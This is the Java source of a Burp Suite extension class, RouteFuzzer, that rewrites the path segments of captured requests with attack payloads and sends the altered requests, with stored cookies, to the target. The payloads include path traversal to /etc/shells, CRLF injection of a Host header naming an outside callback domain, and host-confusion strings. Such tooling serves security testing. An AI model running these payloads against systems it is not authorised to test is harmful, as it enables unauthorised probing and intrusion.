package pzfzr.fuzzer;

import java.util.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.net.URLEncoder;
import java.io.UnsupportedEncodingException;

import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.logging.Logging;
import pzfzr.core.CookieChanger;
import pzfzr.core.RateLimiter;
import pzfzr.core.RequestDeduplicator;
import pzfzr.model.ModifiedRequestResponse;
import pzfzr.model.RequestResponseSaver;
import pzfzr.model.TableModel;

public class RouteFuzzer {
    private final AtomicInteger nextModifiedId = new AtomicInteger(1);
    private final MontoyaApi api;
    private final TableModel tableModel;
    private volatile boolean isShuttingDown = false;

    private static final ThreadLocal<Random> RANDOM = ThreadLocal.withInitial(Random::new);
    private static final String HASH_CHARS = "0123456789abcdefghijklmnopqrstuvwxyz";
    private static final int HASH_LENGTH = 5;

    private final RequestResponseSaver requestResponseSaver;
    private final Logging logging;
    private final RateLimiter rateLimiter;
    private final CookieChanger cookieChanger;
    private final RequestDeduplicator requestDeduplicator;

    // 替换用的payloads列表
    private static final List<String> PAYLOADS = Arrays.asList(
            "norandomx",
            "/{path}",
            "%2f{path}",
            "./{path}",
            "%2e%2f{path}",
            "{path}/../{path}",
            "{path}%2f..%2f{path}",
            "{param}&norandom=xx",
            "{param}%26norandom=xx",
            "{path}/",
            "{path}%2f",
            "{path_url_encoded}",
            "{path_double_url_encoded}",
            "{path}#",
            "{path}%23",
            "{path}?",
            "{path}%3f",
            "{path}/../../../../../../../",
            "{path}%2f..%2f..%2f..%2f..%2f..%2f..%2f..",
            "{path}\\",
            "{path}\\..\\..\\",
            "{path}%5c..%5c..%5c",
            "{path}%20HTTP/1.1%0D%0AHost:%20{fuzz}.abga5.wi11.fun%0D%0Ax2x:%20",
            "file:///etc/shells",
            "{path}/%20H",
            "{path}/%20HTTP/19.91%0D%0AX:%20x",
            "{path}/%20HTTP/1.1%0D%0AHost:%20{fuzz}.abga5.wi11.fun%0D%0Ax2x:",
            "{path1}{path2}",
            "{path}..",
            "{path}@{fuzz}.abga5.wi11.fun",
            "{path}/..;/..;/..;/..;/..;",
            "{path}/..;",
            "{path}/..%2f..%2f..%2f..%2f..",
            "{path}/..%2f",
            "{path}/..%5c..%5c..%5c..%5c..",
            "{path}/..%5c",
            "{path}/",
            "{path}/norandomx",
            "{path}/..//..//..//..//..//..//..//..//..//etc//shells",
            "{path}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshells",
            "{path}/../../../../../../../../etc/shells",
            "{path}/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/shells",
            "{path}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/shells",
            "{path}/\\..\\..\\...\\..\\..\\..\\..\\..\\..\\etc\\shells",
            "{path}/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/shells",
            "{path}/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2F%2E%2F%2F%2E%2F%2F%2E%2F%2Fetc%2Fshells"
    );

    public RouteFuzzer(MontoyaApi api, TableModel tableModel, RequestResponseSaver requestResponseSaver,
                       RateLimiter rateLimiter) {
        this.api = api;
        this.tableModel = tableModel;
        this.requestResponseSaver = requestResponseSaver;
        this.logging = api.logging();
        this.rateLimiter = rateLimiter;
        this.cookieChanger = CookieChanger.getInstance();
        this.requestDeduplicator = RequestDeduplicator.getInstance(this.logging);
    }

    /**
     * 主要的测试方法，使用requestDeduplicator
     * @param originalRequest 原始HTTP请求
     * @param messageId 消息ID
     * @param host 主机名
     */
    public void processRequest(HttpRequest originalRequest, int messageId, String host) {
        if (isShuttingDown) {
            return;
        }

        try {
            String path = originalRequest.pathWithoutQuery();
            if (path == null || path.isEmpty() || path.equals("/")) {
                return; // 跳过根路径或空路径
            }

            // 处理结尾斜杠的情况
            boolean hasTrailingSlash = path.endsWith("/");
            String normalizedPath = hasTrailingSlash ? path.substring(0, path.length() - 1) : path;

            // 分割路径段
            List<String> pathSegments = parsePathSegments(normalizedPath);
            if (pathSegments.isEmpty()) {
                return;
            }

            // 从完整路径开始，逐级减少测试
            for (int level = pathSegments.size(); level >= 1; level--) {
                if (isShuttingDown) {
                    return;
                }

                List<String> currentSegments = pathSegments.subList(0, level);
                boolean shouldTestTrailingSlash = hasTrailingSlash && level == pathSegments.size();

                testPathLevelWithDeduplication(originalRequest, messageId, host, currentSegments, shouldTestTrailingSlash);
            }

        } catch (Exception e) {
            // 错误处理
        }
    }

    /**
     * 不经过requestDeduplicator的测试方法
     * @param originalRequest 原始HTTP请求
     * @param messageId 消息ID
     * @param host 主机名
     */
    public void processRequestWithoutDeduplication(HttpRequest originalRequest, int messageId, String host) {
        if (isShuttingDown) {
            return;
        }

        try {
            String path = originalRequest.pathWithoutQuery();
            if (path == null || path.isEmpty() || path.equals("/")) {
                return;
            }

            boolean hasTrailingSlash = path.endsWith("/");
            String normalizedPath = hasTrailingSlash ? path.substring(0, path.length() - 1) : path;

            List<String> pathSegments = parsePathSegments(normalizedPath);
            if (pathSegments.isEmpty()) {
                return;
            }

            for (int level = pathSegments.size(); level >= 1; level--) {
                if (isShuttingDown) {
                    return;
                }

                List<String> currentSegments = pathSegments.subList(0, level);
                boolean shouldTestTrailingSlash = hasTrailingSlash && level == pathSegments.size();

                testPathLevelWithoutDeduplication(originalRequest, messageId, host, currentSegments, shouldTestTrailingSlash);
            }

        } catch (Exception e) {
            // 错误处理
        }
    }

    /**
     * 解析路径段
     */
    private List<String> parsePathSegments(String path) {
        String[] segments = path.split("/");
        List<String> pathSegments = new ArrayList<>();
        for (String segment : segments) {
            if (!segment.isEmpty()) {
                pathSegments.add(segment);
            }
        }
        return pathSegments;
    }

    /**
     * 测试指定路径级别（使用去重）
     */
    private void testPathLevelWithDeduplication(HttpRequest originalRequest, int messageId, String host,
                                                List<String> pathSegments, boolean testTrailingSlash) {
        // 从最后一个路径段开始，依次向前测试每个段
        for (int segmentIndex = pathSegments.size() - 1; segmentIndex >= 0; segmentIndex--) {
            if (isShuttingDown) {
                return;
            }

            // 对当前段测试每个payload
            for (String payload : PAYLOADS) {
                if (isShuttingDown) {
                    return;
                }

                try {
                    // 测试不带尾部斜杠的版本
                    testSinglePayload(originalRequest, messageId, host, pathSegments, segmentIndex, payload, false, true);

                    // 如果原始路径有尾部斜杠，且当前是最后一个段，也测试带斜杠的版本
                    if (testTrailingSlash && segmentIndex == pathSegments.size() - 1) {
                        testSinglePayload(originalRequest, messageId, host, pathSegments, segmentIndex, payload, true, true);
                    }
                } catch (Exception e) {
                    // 错误处理
                }
            }
        }
    }

    /**
     * 测试指定路径级别（不使用去重）
     */
    private void testPathLevelWithoutDeduplication(HttpRequest originalRequest, int messageId, String host,
                                                   List<String> pathSegments, boolean testTrailingSlash) {
        for (int segmentIndex = pathSegments.size() - 1; segmentIndex >= 0; segmentIndex--) {
            if (isShuttingDown) {
                return;
            }

            for (String payload : PAYLOADS) {
                if (isShuttingDown) {
                    return;
                }

                try {
                    testSinglePayload(originalRequest, messageId, host, pathSegments, segmentIndex, payload, false, false);

                    if (testTrailingSlash && segmentIndex == pathSegments.size() - 1) {
                        testSinglePayload(originalRequest, messageId, host, pathSegments, segmentIndex, payload, true, false);
                    }
                } catch (Exception e) {
                    // 错误处理
                }
            }
        }
    }

    /**
     * 测试单个payload
     */
    private void testSinglePayload(HttpRequest originalRequest, int messageId, String host,
                                   List<String> pathSegments, int targetIndex, String payload,
                                   boolean addTrailingSlash, boolean useDeduplication) {
        String modifiedPath = generateModifiedPath(pathSegments, targetIndex, payload, addTrailingSlash);
        if (modifiedPath != null) {
            if (useDeduplication) {
                String fullUrl = host + modifiedPath;
                if (!requestDeduplicator.shouldSkipRequest(originalRequest.method(), fullUrl, "RouteFuzzer")) {
                    sendTestRequest(originalRequest, messageId, host, modifiedPath);
                }
            } else {
                sendTestRequest(originalRequest, messageId, host, modifiedPath);
            }
        }
    }

    /**
     * 生成修改后的路径
     */
    private String generateModifiedPath(List<String> pathSegments, int targetIndex, String payload, boolean addTrailingSlash) {
        List<String> modifiedSegments = new ArrayList<>(pathSegments);

        String modifiedPayload = payload;

        // 处理 {fuzz} 替换
        if (modifiedPayload.contains("{fuzz}")) {
            char[] hash = new char[HASH_LENGTH];
            for (int i = 0; i < HASH_LENGTH; i++) {
                hash[i] = HASH_CHARS.charAt(RANDOM.get().nextInt(HASH_CHARS.length()));
            }
            modifiedPayload = modifiedPayload.replace("{fuzz}", new String(hash));
        }

        // 处理特殊情况 {path1}{path2}
        if (modifiedPayload.contains("{path1}{path2}")) {
            return handlePath1Path2Payload(modifiedSegments, targetIndex, addTrailingSlash);
        }

        // 处理URL编码的特殊情况
        if (modifiedPayload.equals("{path_url_encoded}")) {
            String targetSegment = modifiedSegments.get(targetIndex);
            String urlEncoded = urlEncode(targetSegment);
            modifiedSegments.set(targetIndex, urlEncoded);
        } else if (modifiedPayload.equals("{path_double_url_encoded}")) {
            String targetSegment = modifiedSegments.get(targetIndex);
            String doubleUrlEncoded = urlEncode(urlEncode(targetSegment));
            modifiedSegments.set(targetIndex, doubleUrlEncoded);
        } else {
            // 处理普通的 {path} 替换
            if (modifiedPayload.contains("{path}")) {
                String targetSegment = modifiedSegments.get(targetIndex);
                modifiedPayload = modifiedPayload.replace("{path}", targetSegment);
            }

            // 处理 {param} 替换 (这里假设用路径段替换)
            if (modifiedPayload.contains("{param}")) {
                String targetSegment = modifiedSegments.get(targetIndex);
                modifiedPayload = modifiedPayload.replace("{param}", targetSegment);
            }

            modifiedSegments.set(targetIndex, modifiedPayload);
        }

        // 构建最终路径
        return buildPath(modifiedSegments, addTrailingSlash);
    }

    /**
     * 全字符URL编码方法 - 将每个字符都编码为%XX格式
     */
    private String urlEncode(String input) {
        if (input == null || input.isEmpty()) {
            return input;
        }

        StringBuilder encoded = new StringBuilder();
        byte[] bytes;
        try {
            bytes = input.getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
            bytes = input.getBytes();
        }

        for (byte b : bytes) {
            encoded.append(String.format("%%%02x", b & 0xFF));
        }

        return encoded.toString();
    }

    /**
     * 处理 {path1}{path2} 特殊情况
     */
    private String handlePath1Path2Payload(List<String> pathSegments, int targetIndex, boolean addTrailingSlash) {
        List<String> modifiedSegments = new ArrayList<>(pathSegments);

        // 根据需求，{path1}{path2} 有几种变体：
        // 1. 当前段 + 下一段 (如果存在下一段)
        // 2. 上一段 + 当前段 (如果存在上一段)
        // 3. 其他组合

        if (targetIndex < modifiedSegments.size() - 1) {
            // 变体1：当前段与下一段组合
            String path1 = modifiedSegments.get(targetIndex);
            String path2 = modifiedSegments.get(targetIndex + 1);
            modifiedSegments.set(targetIndex, path1 + path2);
            modifiedSegments.remove(targetIndex + 1);
        } else if (targetIndex > 0) {
            // 变体2：上一段与当前段组合
            String path1 = modifiedSegments.get(targetIndex - 1);
            String path2 = modifiedSegments.get(targetIndex);
            modifiedSegments.set(targetIndex - 1, path1 + path2);
            modifiedSegments.remove(targetIndex);
        } else {
            // 只有一个段，无法应用 {path1}{path2}
            return null;
        }

        return buildPath(modifiedSegments, addTrailingSlash);
    }

    /**
     * 构建路径字符串
     */
    private String buildPath(List<String> segments, boolean addTrailingSlash) {
        StringBuilder pathBuilder = new StringBuilder();
        for (String segment : segments) {
            pathBuilder.append("/").append(segment);
        }

        if (addTrailingSlash) {
            pathBuilder.append("/");
        }

        return pathBuilder.toString();
    }

    /**
     * 发送测试请求
     */
    private void sendTestRequest(HttpRequest originalRequest, int messageId, String host, String modifiedPath) {
        try {
            // 创建修改后的请求
            HttpRequest modifiedRequest = originalRequest.withPath(modifiedPath);

            // 获取并添加认证相关的header
            List<HttpHeader> authHeaders = cookieChanger.getHttpHeadersForHost(host);
            if (authHeaders != null && !authHeaders.isEmpty()) {
                modifiedRequest = modifiedRequest.withUpdatedHeaders(authHeaders);
            }

            rateLimiter.acquire(modifiedRequest.url() + modifiedRequest.method());

            // 发送修改后的请求
            HttpRequestResponse modifiedResponse = api.http().sendRequest(modifiedRequest);
            int tempID = nextModifiedId.getAndIncrement();

            // 保存修改后的请求和响应
            ModifiedRequestResponse modifiedPair = new ModifiedRequestResponse(
                    tempID,
                    messageId,
                    "ROUTE",
                    "",
                    requestResponseSaver,
                    logging
            );
            tableModel.addModifiedEntry(modifiedPair);
            requestResponseSaver.saveModifiedRequest(modifiedRequest, tempID);
            requestResponseSaver.handleDelayedModifiedResponse(modifiedResponse, tempID);

            // 清理引用
            modifiedRequest = null;
            modifiedResponse = null;

        } catch (Exception e) {
            // 错误处理
        }
    }

    public void setShuttingDown(boolean shuttingDown) {
        this.isShuttingDown = shuttingDown;
    }
}